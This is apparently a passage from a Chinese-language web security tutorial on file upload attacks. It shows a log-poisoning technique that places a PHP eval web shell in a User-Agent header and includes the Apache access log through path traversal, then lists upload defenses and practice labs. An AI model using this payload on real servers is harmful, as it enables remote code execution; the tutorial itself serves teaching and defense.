当你没法直接写文件到 Web 目录时：

**日志写 Shell**（前提：有文件包含）：
```bash
# 先在 User-Agent 里带 PHP 代码发请求 → 污染 access log
GET / HTTP/1.1
User-Agent: <?php @eval($_POST['cmd']);?>

# 然后文件包含日志文件
/index.php?page=../../../var/log/apache2/access.log
```

**Session 写 Shell**：上传文件带 PHP 代码到 session 目录 → 包含 session 文件。

---

### 防御（按推荐程度排序）

1. **最保险**：文件存在 OSS/对象存储，不落 Web 目录。通过应用层 API 访问，绝不直接执行。
2. **重命名**：上传后的文件名用 UUID/随机字符串，保留映射关系。用户永远不知道真实文件名。
3. **扩展名白名单**：只允许 `.jpg` `.png` `.gif` `.pdf` 等纯静态类型。
4. **内容检查 + 压缩再处理**：读文件 → 用 GD/ImageMagick 重新生成一份新的 → 存新文件。吞掉所有嵌入代码。
5. **脚本执行隔离**：如果文件必须落在 Web 目录，给上传目录单独配置 `php_flag engine off`，或在 Nginx/Apache 层面禁用脚本执行。
6. **最小权限**：Web 进程对上传目录只有写权限，没有执行权限。

---

### 练习靶场

1. **DVWA File Upload** — low/medium/high 三层
2. **Upload-labs** — 专门练上传绕过的靶场，20+ 关从浅到深
3. **PortSwigger Web Security Academy** — File upload 系列

---




